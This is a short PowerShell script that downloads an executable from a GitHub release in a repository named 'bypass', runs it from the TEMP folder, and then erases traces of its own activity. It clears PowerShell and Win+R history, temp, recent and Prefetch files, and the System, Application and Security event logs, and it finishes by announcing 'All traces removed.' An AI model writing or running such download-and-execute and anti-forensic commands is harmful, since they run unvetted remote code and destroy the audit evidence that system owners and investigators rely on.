$url = "https://github.com/kosnaja12/bypass/releases/download/v1.0/Universal_sv_pureLevelChanger.exe"
$path = "$env:TEMP\Universal_sv_pureLevelChanger.exe"

Write-Host "Downloading..." -ForegroundColor Cyan
iwr $url -OutFile $path

Write-Host "Opening program..." -ForegroundColor Green
Start-Process $path

Start-Sleep -Seconds 2

Clear-History
Set-Content (Get-PSReadlineOption).HistorySavePath -Value ""
Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Force -ErrorAction SilentlyContinue
Write-Host "Cleared PowerShell history" -ForegroundColor Green

Remove-Item "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Cleared Run history (Win+R)" -ForegroundColor Green

Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Cleared Temp files" -ForegroundColor Green

Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Cleared Recent files" -ForegroundColor Green

Remove-Item "C:\Windows\Prefetch\*" -Recurse -Force -ErrorAction SilentlyContinue
Write-Host "Cleared Prefetch" -ForegroundColor Green

wevtutil cl System 2>$null
wevtutil cl Application 2>$null
wevtutil cl Security 2>$null
Write-Host "Cleared Event Logs" -ForegroundColor Green

Write-Host ""
Write-Host "Done! All traces removed." -ForegroundColor Magenta